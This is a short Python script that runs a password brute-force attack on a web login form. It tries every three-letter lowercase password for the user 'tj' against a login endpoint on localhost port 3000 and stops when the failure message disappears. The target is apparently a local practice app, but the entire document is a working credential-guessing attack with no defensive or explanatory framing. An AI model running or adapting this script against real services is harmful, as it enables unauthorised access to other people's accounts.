import requests
import string
import itertools

# Define the target URL
url = 'http://localhost:3000/login'

# Define the username
username = 'tj'

# Define the alphabet and password length
alphabet = string.ascii_lowercase
password_length = 3

# Generate all possible passwords
passwords = itertools.product(alphabet, repeat=password_length)

# Try each password
for password_tuple in passwords:
    # Convert the password tuple to a string
    password = ''.join(password_tuple)

    # Define the login data
    data = {'username': username, 'password': password}

    # Send a POST request
    response = requests.post(url, data=data)

    # Check if the login was successful
    if 'Authentication failed' not in response.text:
        print(f'Success with password: {password}')
        break